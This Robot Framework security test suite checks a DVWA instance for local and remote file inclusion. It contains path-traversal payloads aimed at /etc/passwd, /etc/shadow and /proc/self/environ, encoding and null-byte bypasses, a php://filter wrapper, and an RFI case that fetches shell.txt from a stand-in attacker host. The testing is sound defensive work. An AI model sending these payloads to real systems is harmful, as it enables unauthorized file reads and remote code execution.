*** Settings ***
Documentation     File Inclusion (LFI & RFI) security tests targeting DVWA.
...
...               LFI (Local File Inclusion): App includes a local file based on user input.
...               Attack reads sensitive files: /etc/passwd, config files, logs.
...
...               RFI (Remote File Inclusion): App fetches and executes a remote URL.
...               Attack executes attacker's script on the server.
...
...               Bypass techniques tested:
...               - Basic path traversal (../../../../etc/passwd)
...               - URL-encoded traversal (%2F instead of /)
...               - Double-slash bypass (....//....//etc/passwd)
...               - Absolute path (just /etc/passwd)
...               - Null byte (for old PHP < 5.3.4)

Library           RequestsLibrary
Library           Collections
Library           String
Resource          ../../Resources/CommonKeywords.robot
Resource          ../../Resources/Variables.robot

Suite Setup       Run Keywords
...               Create Session For DVWA    AND
...               ${COOKIES}=    Get Authenticated Session    AND
...               Set Suite Variable    ${COOKIES}

*** Keywords ***
Attempt File Inclusion
    [Arguments]    ${page_value}
    [Documentation]    GET the file inclusion endpoint with a page parameter.
    ${resp}=    GET Request With Cookies
    ...    path=${FILE_INCLUSION_PATH}
    ...    cookies=${COOKIES}
    ...    params=page=${page_value}
    RETURN    ${resp}

File Content Should Not Be Exposed
    [Arguments]    ${resp}
    Should Not Contain    ${resp.text}    root:x:0:0
    ...    msg=/etc/passwd content exposed — LFI confirmed!
    Should Not Contain    ${resp.text}    [extensions]
    ...    msg=Windows win.ini exposed — LFI on Windows confirmed!
    Should Not Contain    ${resp.text}    /bin/bash
    ...    msg=System shell path exposed in response!

*** Test Cases ***

# ------------------------------------------------------------------ #
#  POSITIVE TEST                                                       #
# ------------------------------------------------------------------ #

LFI_TC01 - Valid Page Parameter Works
    [Documentation]    Baseline: a valid page name (include1.php) must load correctly.
    [Tags]    lfi    positive    baseline
    ${resp}=    Attempt File Inclusion    include1.php
    Should Be Equal As Integers    ${resp.status_code}    200
    Log    Valid page parameter accepted. Status: ${resp.status_code}

# ------------------------------------------------------------------ #
#  BASIC PATH TRAVERSAL                                                #
# ------------------------------------------------------------------ #

LFI_TC02 - Basic Path Traversal to etc/passwd Is Blocked
    [Documentation]    Classic LFI: traverse up with ../../../../ to reach /etc/passwd.
    ...                The number of ../ needed varies by app's base directory.
    ...                Vulnerable: returns file contents.
    ...                Secure: returns 404, error, or filtered output.
    [Tags]    lfi    path_traversal    high_priority
    ${resp}=    Attempt File Inclusion    ../../../../etc/passwd
    File Content Should Not Be Exposed    ${resp}
    Log    Basic path traversal blocked.

LFI_TC03 - Deep Path Traversal Is Blocked
    [Documentation]    More ../ to ensure we reach root regardless of base dir depth.
    ...                Payload: ../../../../../../etc/passwd (6 levels up)
    [Tags]    lfi    path_traversal
    ${resp}=    Attempt File Inclusion    ../../../../../../etc/passwd
    File Content Should Not Be Exposed    ${resp}

LFI_TC04 - Absolute Path Is Blocked
    [Documentation]    Bypass using absolute path instead of traversal: /etc/passwd
    ...                Some apps strip ../ but still allow absolute paths.
    [Tags]    lfi    absolute_path
    ${resp}=    Attempt File Inclusion    /etc/passwd
    File Content Should Not Be Exposed    ${resp}

# ------------------------------------------------------------------ #
#  ENCODING BYPASSES                                                   #
# ------------------------------------------------------------------ #

LFI_TC05 - URL-Encoded Traversal Is Blocked
    [Documentation]    URL-encode the slash: %2F instead of /
    ...                Payload: ..%2F..%2F..%2F..%2Fetc%2Fpasswd
    ...                Bypasses filters that check for ../ literally.
    [Tags]    lfi    encoding_bypass
    ${resp}=    Attempt File Inclusion    ..%2F..%2F..%2F..%2Fetc%2Fpasswd
    File Content Should Not Be Exposed    ${resp}

LFI_TC06 - Double URL-Encoded Traversal Is Blocked
    [Documentation]    Double-encode: %252F (decoded twice → /)
    ...                Some apps decode once and the filter runs on decoded value,
    ...                but the server decodes again before use.
    [Tags]    lfi    encoding_bypass
    ${resp}=    Attempt File Inclusion    ..%252F..%252F..%252F..%252Fetc%252Fpasswd
    File Content Should Not Be Exposed    ${resp}

LFI_TC07 - Double-Slash Filter Bypass Is Blocked
    [Documentation]    Bypass filters that strip exactly '../' once.
    ...                Payload: ....//....//....//etc/passwd
    ...                After stripping '../', becomes ../../etc/passwd — still traverses!
    [Tags]    lfi    filter_bypass
    ${resp}=    Attempt File Inclusion    ....//....//....//etc/passwd
    File Content Should Not Be Exposed    ${resp}

# ------------------------------------------------------------------ #
#  NULL BYTE BYPASS (old PHP)                                          #
# ------------------------------------------------------------------ #

LFI_TC08 - Null Byte Bypass Is Blocked
    [Documentation]    PHP < 5.3.4 truncated strings at %00 (null byte).
    ...                Payload: ../../../../etc/passwd%00.php
    ...                The .php suffix the app appends is ignored → includes /etc/passwd.
    ...                Modern PHP is not vulnerable, but worth testing legacy systems.
    [Tags]    lfi    null_byte    legacy
    ${resp}=    Attempt File Inclusion    ../../../../etc/passwd%00.php
    File Content Should Not Be Exposed    ${resp}
    Log    Null byte bypass blocked.

# ------------------------------------------------------------------ #
#  SENSITIVE FILE TARGETS                                              #
# ------------------------------------------------------------------ #

LFI_TC09 - System Config Files Are Not Exposed
    [Documentation]    Targets common high-value config files.
    [Tags]    lfi    config_files
    FOR    ${target}    IN
    ...    ../../../../etc/shadow
    ...    ../../../../etc/hosts
    ...    ../../../../proc/self/environ
    ...    ../../../../var/www/html/config.php
        ${resp}=    Attempt File Inclusion    ${target}
        Should Not Be Equal As Integers    ${resp.status_code}    200
        ...    msg=Possible LFI: ${target} returned 200!
        File Content Should Not Be Exposed    ${resp}
    END

LFI_TC10 - Windows Config Files Are Not Exposed
    [Documentation]    Tests Windows-specific file targets (for apps on Windows servers).
    [Tags]    lfi    windows
    FOR    ${target}    IN
    ...    ../../../../windows/win.ini
    ...    ..\\..\\..\\..\\windows\\win.ini
    ...    ../../../../boot.ini
        ${resp}=    Attempt File Inclusion    ${target}
        File Content Should Not Be Exposed    ${resp}
    END

# ------------------------------------------------------------------ #
#  REMOTE FILE INCLUSION                                               #
# ------------------------------------------------------------------ #

LFI_TC11 - Remote File Inclusion From External URL Is Blocked
    [Documentation]    RFI: passes a URL as the page parameter.
    ...                Vulnerable: fetches and executes the remote script.
    ...                Secure: rejects URLs or doesn't have allow_url_include=On.
    [Tags]    rfi    remote    critical
    ${resp}=    Attempt File Inclusion    http://evil.example.com/shell.txt
    # Must not succeed — 200 with actual content from remote URL would be critical
    ${status}=    Convert To String    ${resp.status_code}
    Run Keyword If    '${status}' == '200'
    ...    Log    WARNING: RFI may be possible — check if remote content was fetched!    WARN
    Log    RFI test result: ${resp.status_code}

LFI_TC12 - Protocol Wrapper Bypass Is Blocked
    [Documentation]    PHP wrappers can read files or execute code.
    ...                php://filter can dump base64-encoded file contents.
    ...                Payload: php://filter/convert.base64-encode/resource=index.php
    [Tags]    rfi    php_wrapper    advanced
    ${resp}=    Attempt File Inclusion    php://filter/convert.base64-encode/resource=index.php
    # If vulnerable, response contains base64 content of index.php
    Should Not Contain    ${resp.text}    PD9waHA    # base64 of "<?ph"
    Log    PHP filter wrapper test result: ${resp.status_code}
